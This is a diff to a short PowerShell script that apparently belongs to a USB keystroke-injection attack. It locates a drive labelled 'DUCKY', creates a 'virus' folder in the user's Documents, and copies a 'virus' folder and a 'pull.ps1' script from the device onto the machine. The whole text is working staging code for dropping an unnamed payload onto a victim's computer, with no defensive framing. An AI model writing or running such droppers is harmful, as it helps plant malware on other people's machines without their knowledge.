@@ -1,10 +1,10 @@
-New-Item -Path "C:\Users\$localUsername\Documents" -Name 'virus' -ItemType "directory"
 
+$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
 $localUsername = $env:USERNAME
+New-Item -Path "C:\Users\$localUsername\Documents" -Name 'virus' -ItemType "directory"
+$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\virus" -Recurse -Filter "pull.ps1"
 
-$pullPathBeforeCopy = Get-ChildItem -Path C:\ -Recurse -Filter "pull.ps1"
-
-$pathBeforeCopy = Get-ChildItem -Path C:\Users\$localUsername -Directory -Recurse -Filter "virus"
+$pathBeforeCopy = Get-ChildItem -Path "$driveLetter\" -Directory -Recurse -Filter "virus"
 $pathAfterCopy = "C:\Users\$localUsername\Documents\virus"
 
 Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
